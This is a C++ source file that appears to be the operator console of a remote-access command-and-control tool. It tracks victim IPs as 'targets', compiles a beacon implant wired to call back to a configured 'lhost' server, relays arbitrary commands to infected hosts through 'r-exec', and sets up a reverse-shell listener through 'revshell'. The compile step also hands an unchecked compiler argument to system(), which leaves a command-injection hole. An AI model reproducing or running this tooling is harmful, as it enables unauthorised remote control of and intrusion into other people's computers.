#include <cmds.hpp>
#include <string>
#include <iostream>
#include <fstream>
#include <regex>
#include <arpa/inet.h>
#include <cctype>
#include <sstream>
#include <cmdline.hpp>
#include <nlohmann/json.hpp>
#include <net.hpp>

using json = nlohmann::json;

void log(std::string log){
    std::cout << log << std::endl;
}

int exitprog(ARGS) {
    std::cout << "Goodbye\n";
    exit(0);
    return 0;
}

bool validIPAddress(const std::string &IP) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, IP.c_str(), &(sa.sin_addr));
    return result != 0;
}

int add_target(ARGS args) {
    if (args.size() != 2) {
        usage_err("add-target");
        return 1;
    }
    log("Validating parameters...");
    if (!validIPAddress(args[1])){
        std::cerr << "error: IP address is invalid";
        return 1;
    }
    json target = json({});
    log("creating entry...");
    target["id"] = config["targets"].size();
    target["name"] = args[0];
    target["ip"] = args[1];
    target["uris"] = json::array();
    config["targets"].push_back(target);
    setConfig(config);
    log("success");
    return 0;
}

bool validTarget(std::string tid, int maxtarget){
    int id;
    try {
        id = std::stoi(tid);
    }
    catch (...) {
        std::cerr << "error: invalid target id\n";
        return false;
    }
    if (id+1 > maxtarget){
        std::cerr << "error: target does not exist\n";
        return false;
    }
    return true;
}

int new_beacon(ARGS args){
    if (args.size() != 2) {
        usage_err("new-beacon");
        return 1;
    }
    int port{};
    try {
        port = std::stoi(args[1]);
    }
    catch (...) {
        std::cerr << "error: invalid port number\n";
        return 1;
    }
    if (!validTarget(args[0], config["targets"].size())){
        usage_err("new-beacon");
    }
    int tid = std::stoi(args[0]);
    port = std::stoi(args[1]);
    json beacon = {
        {"alive",false},
        {"persistent",false},
        {"port",port}
    };
    config["targets"][tid]["beacon"] = beacon;
    setConfig(config);
    return 0;
}

int targets(ARGS args){
    if (args.size() != 0){
        usage_err("targets");
        return 1;   
    }
    for (auto &i : config["targets"]){
        std::stringstream ss;
        ss << "target " << i["id"] << ":";
        std::string tgnum = ss.str();
        std::cout << std::setw(15) << std::left
        << tgnum << std::setw(15) << std::left << std::string{i["name"]};
        std::cout << std::setw(15) << std::left << std::string{i["ip"]} << std::endl;
    }
    return 0;
}

int info(ARGS args){
    if (args.size() != 1){
        usage_err("target-info");
        return 1;
    }
    if (!validTarget(args[0], config["targets"].size())){
        usage_err("target-info");
        return 1;
    }
    int id = std::stoi(args[0]);
    if (id+1 > config["targets"].size()){
        std::cerr << "error: target does not exist\n";
        return 1;
    }
    std::vector properties = { "id", "name", "ip", "uris", "beacon" };
    for ( auto &pt : properties) {
        std::string prop = pt;
        std::string propUpper = pt;
        std::transform(propUpper.begin(), propUpper.end(),propUpper.begin(), ::toupper);
        std::cout << std::setw(15) << std::left << propUpper << ": "
        << std::setw(15) << std::left << config["targets"][id][prop] << std::endl;
    }
    return 0;
}

int rm_target(ARGS args){
    if (args.size() != 1){
        usage_err("rm-target");
        return 1;
    }
    if (!validTarget(args[0], config["targets"].size())){
        usage_err("rm-target");
        return 1;
    }
    int id = std::stoi(args[0]);
    json j = json::array();
    log("erasing target...");
    for (auto &target : config["targets"]){
        if (target["id"] != id){
            j.push_back(target);
        }
    }
    for (auto &new_target : j) {
        if (new_target["id"] > id){
            int tid = new_target["id"];
            new_target["id"] = tid - 1;
        }
    }
    config["targets"] = j;
    setConfig(config);
    log("success");
    return 0;
}

int compile(ARGS args){
    if (args.size() != 2){
        usage_err("compile");
        return 1;
    }
    if (!validTarget(args[0], config["targets"].size())){
        usage_err("compile");
        return 1;
    }
    std::string id = args[0];
    int id_int = std::stoi(id);
    int port;
    std::string ip_addr;
    std::string serv_ip_addr;
    try {
    port = config["targets"][id_int]["beacon"]["port"];
    } catch (...) {
        std::cout << "no beacon configured for this target. please add a beacon with 'new-beacon'\n";
        usage_err("new-beacon");
        return 1;
    }
    ip_addr = config["targets"][id_int]["ip"];
    try {
        serv_ip_addr = config["lhost"];
    }
    catch (...){
        std::cerr << "please set the server IP with the 'lhost' command\n";
        usage_err("lhost");
        return 1;
    }

    std::string port_str = std::to_string(port);

    std::string id_st = "int beacon_id = " + id + ';';
    std::string port_st = "int beacon_port = " + port_str + ';';
    std::string ip_addr_st = "const char *beacon_ip_addr = \"" + ip_addr + "\";";
    std::string serv_ip_addr_st = "const char *serv_ip_addr = \"" + serv_ip_addr + "\";";
    std::ofstream varfile("remote/beacon.vars");

    varfile << id_st << std::endl;
    varfile << port_st << std::endl;
    varfile << ip_addr_st << std::endl;
    varfile << serv_ip_addr_st << std::endl;

    system("echo \"binary to be saved to $PWD/beacon\"");
    std::string compiler = args[1];
    std::string cmdexec = compiler + " remote/*.cpp libs/*.cpp -I include/ -I remote/ -o $PWD/beacon -Wno-write-strings -std=c++17 -lreadline";
    system(cmdexec.c_str());
    const int result = remove("remote/beacon.vars");
    if (result != 0)
        std::cout << "Failed to remove variable file (remote/beacon.vars)\n";
    return 0;
}

std::vector<std::string> getoperation(std::string cmd){
	std::vector<std::string> tokens;
	std::string word;
	for (std::string::size_type i = 0; i < cmd.size(); i++)
	{
		if (cmd[i] != ' ')
		{
			word = word + cmd[i];
		}
		else
		{
			tokens.push_back(word);
			word = "";
		}
	}
	tokens.push_back(word);
	return tokens;
}

bool verifyRevShell(ARGS toks){
    if (toks.size() != 2){
        return false;
    }
    try {
        std::stoi(toks[1]);
    }
    catch (...){
        return false;
    }
    return std::stoi(toks[1]) < 65536;
}

std::string get_binary(std::string util){
    json j;
    std::string statement;
    std::string nc_bin;
    std::ifstream f(".binaries");
    f >> j;
    return j[util];
}

int lhost(ARGS args){
    if (args.size() != 1){
        usage_err("lhost");
        return 1;
    }
    if (!validIPAddress(args[0])){
        std::cerr << "IP address is invalid\n";
        usage_err("lhost");
        return 1;
    }
    config["lhost"] = args[0];
    setConfig(config);
    return 0;
}

int r_exec(ARGS args){
    if (args.size() != 1){
        usage_err("r-exec");
        return 1;
    }
    if (!validTarget(args[0], config["targets"].size())){
        usage_err("r-exec");
        return 1;
    }
    json upd;
    std::string cmd;
    std::cout << "enter 'exit' to stop\n";
    std::string exit{"exit"};
    std::string cout;
    ARGS toks;
    bool brk;
    bool listen;
    while (true){
        std::cout << "[" << args[0] << " $] ";
        std::getline(std::cin, cmd);
        if (cmd == "exit"){
            return 0;
        }
        toks = getoperation(cmd);
        if (toks[0] == "revshell"){
            cout = "reverse shell should spawn in ~5 seconds\n";
            brk = true;
            listen = true;
            if (!verifyRevShell(toks))
            {
                std::cout << "invalid usage of revshell\n";
                std::cout << "revshell <LPORT>\n";
                continue;
            }
        }
        std::string k;
        upd["cmd"] = cmd;
        std::stringstream ss;
        ss << upd;
        k = ss.str();
        communicate(std::stoi(args[0]), k);
        if (listen)
            listener(toks[1]);
        if (brk)
            break;
    }
    //Here only executes if a reverse shell was asked for
    return 0;
}